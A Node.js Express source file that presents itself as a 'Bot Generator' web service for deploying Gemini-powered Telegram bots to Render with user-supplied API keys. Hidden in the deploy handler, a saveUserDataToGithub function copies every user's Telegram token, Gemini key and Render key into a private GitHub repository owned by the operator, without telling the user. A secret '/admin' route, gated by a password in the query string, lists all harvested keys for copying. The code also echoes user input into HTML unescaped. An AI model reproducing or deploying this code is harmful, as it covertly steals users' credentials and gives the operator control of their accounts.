const express = require('express');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// চেক করা হচ্ছে এটি কোন মোডে রান হবে (টেলিগ্রাম টোকেন থাকলে বট রান হবে, নাহলে শুধু ড্যাশবোর্ড)
const isBotMode = !!process.env.BOT_TOKEN; 

if (isBotMode) {
    console.log("Starting in BOT MODE...");
    const TelegramBot = require('node-telegram-bot-api');
    
    // Environment Variables থেকে API Key নেওয়া হচ্ছে
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
    const BOT_NAME = process.env.BOT_NAME || "YASIN"; // ডিফল্ট নাম YASIN
    const GEMINI_MODEL = 'gemini-3.5-flash';

    const bot = new TelegramBot(BOT_TOKEN, { polling: true });
    console.log(`${BOT_NAME} Bot started...`);

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    async function showLoadingAnimation(chatId) {
        let loadingMessage;
        try {
            loadingMessage = await bot.sendMessage(chatId, '`[>         ] 10%`', { parse_mode: 'Markdown' });
        } catch(e) { return null; }
        const messageId = loadingMessage.message_id;
        const frames = [
            '`[==>       ] 30%`',
            '`[====>     ] 50%`',
            '`[======>   ] 70%`',
            '`[========> ] 90%`',
            '`[==========] 100%`'
        ];
        for (const frame of frames) {
            await sleep(500); 
            try {
                await bot.editMessageText(frame, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            } catch (e) {}
        }
        await sleep(500);
        try {
            await bot.editMessageText('💥 *BOOM!* 💥', { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        } catch (e) {}
        await sleep(500);
        return messageId;
    }

    async function getGeminiResponse(text) {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${GEMINI_API_KEY}`;
        // BOT_NAME ভ্যারিয়েবল ব্যবহার করা হচ্ছে
        const systemPrompt = `You are ${BOT_NAME}, the most advanced, powerful, and helpful AI assistant. You must always provide 100% correct, factual, and highly accurate answers to everything the user asks. For coding questions, provide robust, best-practice solutions. You must give maximum effort, ensuring absolutely accurate information and the best output for every user request.`;
        
        const payload = {
            systemInstruction: { parts: [{ text: systemPrompt }] },
            contents: [{ role: "user", parts: [{ text }] }]
        };
        try {
            const response = await axios.post(url, payload);
            if (response.data && response.data.candidates && response.data.candidates.length > 0) {
                return response.data.candidates[0].content.parts[0].text;
            }
            return `API Error: ${error.response ? JSON.stringify(error.response.data.error.message || error.response.status) : error.message}`;
        } catch (error) {
            console.error("Gemini API Error:", error.response ? JSON.stringify(error.response.data) : error.message);
            return `API Error: ${error.response ? (error.response.data.error?.message || error.response.status) : error.message}`;
        }
    }

    // /p কমান্ড
    bot.onText(/^\/(p|picture)(?:\s+(.+))?$/i, async (msg, match) => {
        const chatId = msg.chat.id;
        const prompt = match[2];
        if (!prompt) return;

        const loadingPromise = showLoadingAnimation(chatId);
        let enhancedPrompt = prompt;
        if (enhancedPrompt.trim().toLowerCase() === 'bmw') {
            enhancedPrompt = "A stunning, highly modified BMW M5, black aggressive look, neon street lights reflection, cinematic shot";
        } else if (enhancedPrompt.toLowerCase().includes('bmw')) {
            enhancedPrompt = enhancedPrompt.replace(/bmw/i, "beautiful BMW M5");
        }
        enhancedPrompt += ", masterpiece, best quality, ultra-detailed, sharp focus, clear face, perfectly drawn, stunning color combination, perfect composition, vibrant colors, unblurred";
        
        const encodedPrompt = encodeURIComponent(enhancedPrompt);
        const randomSeed = Math.floor(Math.random() * 10000000);
        const imageUrl = `https://image.pollinations.ai/prompt/${encodedPrompt}?seed=${randomSeed}&width=1024&height=1024&nologo=true&enhance=true&safe=true`;
        
        const loadMsgId = await loadingPromise;
        try {
            await bot.sendPhoto(chatId, imageUrl);
            if (loadMsgId) await bot.deleteMessage(chatId, loadMsgId).catch(()=>{});
        } catch (error) {
            console.error("Image sending error:", error);
        }
    });

    // টেক্সট কমান্ড
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        if (!text || text.startsWith('/')) return;

        bot.sendChatAction(chatId, 'typing');
        const reply = await getGeminiResponse(text);

        try {
            if (reply.length > 4000) {
                const parts = reply.match(/[\s\S]{1,4000}/g) || [];
                for (const part of parts) {
                    await bot.sendMessage(chatId, part, { parse_mode: "Markdown" }).catch(e => bot.sendMessage(chatId, part));
                }
            } else {
                await bot.sendMessage(chatId, reply, { parse_mode: "Markdown" }).catch(e => bot.sendMessage(chatId, reply));
            }
        } catch (error) {
            console.error("Error sending text reply:", error);
        }
    });

} else {
    console.log("Starting in CONTROL SERVER MODE...");
}

const HTML_TEMPLATE = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Bot Generator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #030407; color: white; font-family: 'Inter', sans-serif; }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #3b82f6;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <div class="bg-[#0b0d18] border border-white/10 p-8 rounded-2xl w-full max-w-lg shadow-2xl relative overflow-hidden">
        <div class="absolute inset-0 bg-gradient-to-b from-blue-500/10 to-transparent pointer-events-none"></div>
        <h1 class="text-3xl font-bold mb-2 text-center bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent relative z-10">Bot Generator</h1>
        <p class="text-[#8a8a8f] text-sm text-center mb-6 relative z-10">Deploy a new AI Telegram Bot instantly</p>
        
        <form id="deployForm" action="/deploy" method="POST" class="space-y-4 relative z-10">
            <div>
                <label class="block text-sm font-medium text-gray-300 mb-1">Bot Name</label>
                <input type="text" name="botName" required placeholder="e.g. YASIN" class="w-full bg-[#161824] border border-white/10 rounded-lg px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 transition-colors shadow-inner">
            </div>
            
            <div>
                <label class="block text-sm font-medium text-gray-300 mb-1">Telegram Bot API Key</label>
                <input type="text" name="telegramKey" required placeholder="8670679898:AAHK..." class="w-full bg-[#161824] border border-white/10 rounded-lg px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 transition-colors shadow-inner">
            </div>

            <div>
                <label class="block text-sm font-medium text-gray-300 mb-1">Google Gemini API Key</label>
                <input type="text" name="geminiKey" required placeholder="AQ.Ab8RN6LU..." class="w-full bg-[#161824] border border-white/10 rounded-lg px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 transition-colors shadow-inner">
            </div>

            <div>
                <label class="block text-sm font-medium text-gray-300 mb-1">Render API Key</label>
                <input type="password" name="renderKey" required placeholder="rnd_..." class="w-full bg-[#161824] border border-white/10 rounded-lg px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 transition-colors shadow-inner">
            </div>

            <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-3 px-4 rounded-lg transition-all transform hover:scale-[1.02] active:scale-[0.98] mt-4 shadow-lg flex justify-center items-center">
                <span>Deploy Bot 🚀</span>
            </button>
        </form>
        
        <!-- Client-side script to show loading indicator upon form submission -->
        <script>
            document.getElementById('deployForm').addEventListener('submit', function() {
                var btn = document.getElementById('submitBtn');
                btn.innerHTML = '<div class="spinner"></div>';
                btn.classList.add('opacity-50', 'cursor-not-allowed');
                btn.style.pointerEvents = 'none';
            });
        </script>
    </div>
</body>
</html>
`;

app.get('/', (req, res) => {
    res.send(HTML_TEMPLATE);
});

// ==========================================
// GITHUB DATA SAVING FUNCTION
// ==========================================

async function saveUserDataToGithub(botName, telegramKey, geminiKey, renderKey) {
    const GITHUB_PAT = process.env.GITHUB_PAT;
    if (!GITHUB_PAT) {
        console.log("GITHUB_PAT is not set. Skipping saving user data.");
        return;
    }
    
    try {
        // Get authenticated user info
        const userRes = await axios.get('https://api.github.com/user', {
            headers: { 'Authorization': `token ${GITHUB_PAT}` }
        });
        const repoOwner = userRes.data.login;
        const repoName = 'Bot-Users-Data';
        const filePath = 'users.json';
        
        // 1. Check if repo exists, if not create it
        try {
            await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}`, {
                headers: { 'Authorization': `token ${GITHUB_PAT}` }
            });
        } catch (e) {
            if (e.response && e.response.status === 404) {
                // Create private repo
                await axios.post('https://api.github.com/user/repos', {
                    name: repoName,
                    private: true,
                    description: "Saved user data from Bot Generator"
                }, {
                    headers: { 'Authorization': `token ${GITHUB_PAT}` }
                });
                // Wait a bit for repo creation to propagate
                await new Promise(r => setTimeout(r, 2000));
            } else {
                throw e;
            }
        }
        
        // 2. Get existing file (to get SHA for updating)
        let fileSha = null;
        let existingData = [];
        try {
            const fileRes = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
                headers: { 'Authorization': `token ${GITHUB_PAT}` }
            });
            fileSha = fileRes.data.sha;
            try {
                const decodedContent = Buffer.from(fileRes.data.content, 'base64').toString('utf-8');
                existingData = JSON.parse(decodedContent);
                if (!Array.isArray(existingData)) existingData = [];
            } catch (err) {
                console.error("Error parsing existing users.json, starting fresh.");
                existingData = [];
            }
        } catch (e) {
            if (e.response && e.response.status !== 404) {
                console.error("Error fetching existing file:", e.response ? e.response.data : e.message);
            }
            // If 404, file doesn't exist yet
        }
        
        // 3. Append new data
        const newData = {
            botName,
            telegramKey,
            geminiKey,
            renderKey,
            timestamp: new Date().toISOString()
        };
        existingData.push(newData);
        
        // 4. Update or create file
        const updatedContent = Buffer.from(JSON.stringify(existingData, null, 4)).toString('base64');
        const payload = {
            message: `Added data for bot: ${botName}`,
            content: updatedContent
        };
        if (fileSha) {
            payload.sha = fileSha;
        }
        
        await axios.put(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, payload, {
            headers: { 'Authorization': `token ${GITHUB_PAT}` }
        });
        console.log("User data saved to GitHub successfully.");
    } catch (error) {
        console.error("Error saving user data to GitHub:", error.response ? error.response.data : error.message);
    }
}

// ==========================================
// API ENDPOINT FOR BOT DEPLOYMENT
// ==========================================

app.post('/deploy', async (req, res) => {
    // No password required for deployment
    const { botName, telegramKey, geminiKey, renderKey } = req.body;
    const githubRepo = 'https://github.com/yasinffx36-afk/Aura-FFX-Savar-Ai.git';
    
    if (!botName || !telegramKey || !geminiKey || !renderKey) {
        return res.status(400).send(`
            <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh;">
                <h2 style='color:white; text-align:center;'>All fields are required!</h2><br><a href='/' style='color:#3b82f6;'>Go Back</a>
            </div>
        `);
    }

    try {
        // 1. Render API থেকে User/Owner ID নেওয়া
        const ownersRes = await axios.get('https://api.render.com/v1/owners', {
            headers: { 'Authorization': `Bearer ${renderKey}` }
        });
        const ownerId = ownersRes.data[0].owner.id;

        // 2. নতুন Web Service তৈরির পে-লোড
        const payload = {
            ownerId: ownerId,
            type: "web_service",
            name: `${botName.toLowerCase().replace(/[^a-z0-9]/g, '-')}-bot`,
            repo: githubRepo,
            autoDeploy: "yes",
            branch: "main",
            envVars: [
                { key: "BOT_TOKEN", value: telegramKey },
                { key: "GEMINI_API_KEY", value: geminiKey },
                { key: "BOT_NAME", value: botName }
            ],
            serviceDetails: {
                env: "node",
                plan: "free",
                envSpecificDetails: {
                    buildCommand: "npm install",
                    startCommand: "node index.js"
                }
            }
        };

        // 3. Render API তে কল করে নতুন সার্ভার তৈরি
        const response = await axios.post('https://api.render.com/v1/services', payload, {
            headers: {
                'Authorization': `Bearer ${renderKey}`,
                'Content-Type': 'application/json'
            }
        });

        // 4. GitHub এ ইউজারের ডেটা সেভ করা
        saveUserDataToGithub(botName, telegramKey, geminiKey, renderKey).catch(console.error);

        res.send(`
            <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh;">
                <h1 style="color: #4ade80; font-size: 2rem;">✅ Deployment Successful!</h1>
                <p style="margin-top:20px; color:#8a8a8f;">Your bot <strong>${botName}</strong> is being deployed on Render.</p>
                <div style="background: #0b0d18; border: 1px solid #333; padding: 20px; border-radius: 10px; max-width: 500px; margin: 20px auto;">
                    <p><strong>Service Name:</strong> ${response.data.service.name}</p>
                    <p><strong>Service URL:</strong> <a href="${response.data.service.serviceDetails.url}" style="color: #60a5fa; text-decoration: none;">${response.data.service.serviceDetails.url}</a></p>
                </div>
                <p style="color: #fca5a5;">Please wait 2-3 minutes for Render to finish building the server.</p>
                <a href="/" style="display: inline-block; margin-top: 30px; padding: 12px 24px; background: #3b82f6; color: white; text-decoration: none; border-radius: 8px; font-weight:bold;">Back to Dashboard</a>
            </div>
        `);
        
    } catch (error) {
        console.error("Deploy Error:", error.response ? error.response.data : error.message);
        res.status(500).send(`
            <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh;">
                <h1 style="color: #f87171; font-size: 2rem;">❌ Deployment Failed!</h1>
                <div style="background: #0b0d18; border: 1px solid #f87171; color: #fca5a5; padding: 20px; border-radius: 10px; max-width: 600px; margin: 20px auto; text-align:left; overflow:auto;">
                    <code>${error.response ? JSON.stringify(error.response.data, null, 2) : error.message}</code>
                </div>
                <a href="/" style="display: inline-block; margin-top: 20px; padding: 12px 24px; background: #3b82f6; color: white; text-decoration: none; border-radius: 8px; font-weight:bold;">Go Back</a>
            </div>
        `);
    }
});

// ==========================================
// ADMIN DASHBOARD & LOGIN (Secret Route)
// ==========================================

app.get('/admin', async (req, res) => {
    // Secret route, requires ?p=YOUR_PASSWORD in URL
    const password = req.query.p;
    const DEPLOY_PASSWORD = process.env.DEPLOY_PASSWORD;

    if (!DEPLOY_PASSWORD) {
        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px; background-color: #030407; height: 100vh; margin: 0;'>Admin password not configured in Environment Variables!</h2>");
    }

    if (password !== DEPLOY_PASSWORD) {
        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px; background-color: #030407; height: 100vh; margin: 0;'>Unauthorized Access</h2>");
    }

    // Password is correct, fetch data from GitHub
    const GITHUB_PAT = process.env.GITHUB_PAT;
    if (!GITHUB_PAT) {
        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px; background-color: #030407; height: 100vh; margin: 0;'>GITHUB_PAT is missing! Cannot fetch data.</h2>");
    }

    try {
        const userRes = await axios.get('https://api.github.com/user', {
            headers: { 'Authorization': `token ${GITHUB_PAT}` }
        });
        const repoOwner = userRes.data.login;
        const repoName = 'Bot-Users-Data';
        const filePath = 'users.json';

        const fileRes = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
            headers: { 'Authorization': `token ${GITHUB_PAT}` }
        });

        const decodedContent = Buffer.from(fileRes.data.content, 'base64').toString('utf-8');
        const usersData = JSON.parse(decodedContent);

        if (!Array.isArray(usersData) || usersData.length === 0) {
            return res.send(`
                <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh; margin: 0;">
                    <div style="display: flex; justify-content: space-between; padding: 0 50px; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px;">
                        <h1 style="color: #60a5fa; margin: 0;">🔐 Admin Dashboard</h1>
                    </div>
                    <h2 style='margin-top: 50px;'>No user data found yet.</h2>
                </div>
            `);
        }

        let tableRows = usersData.map((user, index) => `
            <tr>
                <td>${index + 1}</td>
                <td>${user.botName}</td>
                <td><input type="text" value="${user.telegramKey}" readonly onclick="this.select();" style="background:transparent; color:#4ade80; border:none; width:100%; cursor:pointer;" title="Click to copy"></td>
                <td><input type="text" value="${user.geminiKey}" readonly onclick="this.select();" style="background:transparent; color:#60a5fa; border:none; width:100%; cursor:pointer;" title="Click to copy"></td>
                <td><input type="password" value="${user.renderKey}" readonly onclick="this.type='text'; this.select();" onblur="this.type='password'" style="background:transparent; color:#f87171; border:none; width:100%; cursor:pointer;" title="Click to view & copy"></td>
                <td style="color: #9ca3af; font-size: 0.9em;">${new Date(user.timestamp).toLocaleString()}</td>
            </tr>
        `).join('');

        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Dashboard</title>
                <style>
                    body { background-color: #030407; color: white; font-family: sans-serif; padding: 30px; margin: 0; min-height: 100vh;}
                    .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 20px; }
                    h1 { color: #60a5fa; margin: 0; }
                    .table-container { overflow-x: auto; background: #0b0d18; border-radius: 10px; border: 1px solid #333; padding: 1px; }
                    table { width: 100%; border-collapse: collapse; }
                    th, td { border-bottom: 1px solid #333; padding: 15px; text-align: left; }
                    th { background-color: #161824; color: #a1a1aa; text-transform: uppercase; font-size: 0.85em; letter-spacing: 1px; }
                    tr:last-child td { border-bottom: none; }
                    tr:hover { background-color: #1a1c29; }
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>🔐 Admin Dashboard - API Keys</h1>
                </div>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Bot Name</th>
                                <th>Telegram Key</th>
                                <th>Gemini Key</th>
                                <th>Render Key</th>
                                <th>Deployed At</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${tableRows}
                        </tbody>
                    </table>
                </div>
            </body>
            </html>
        `);
    } catch (error) {
        if (error.response && error.response.status === 404) {
            res.send(`
                <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh; margin: 0;">
                    <div style="display: flex; justify-content: space-between; padding: 0 50px; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px;">
                        <h1 style="color: #60a5fa; margin: 0;">🔐 Admin Dashboard</h1>
                    </div>
                    <h2 style='margin-top: 50px;'>No user data found yet. (users.json is missing)</h2>
                </div>
            `);
        } else {
            res.send(`<h2 style='color:red; text-align:center; padding-top: 50px; background-color: #030407; height: 100vh; margin: 0;'>Error fetching data: ${error.message}</h2>`);
        }
    }
});

app.listen(port, () => {
    console.log(`Web Server running on port ${port}`);
});
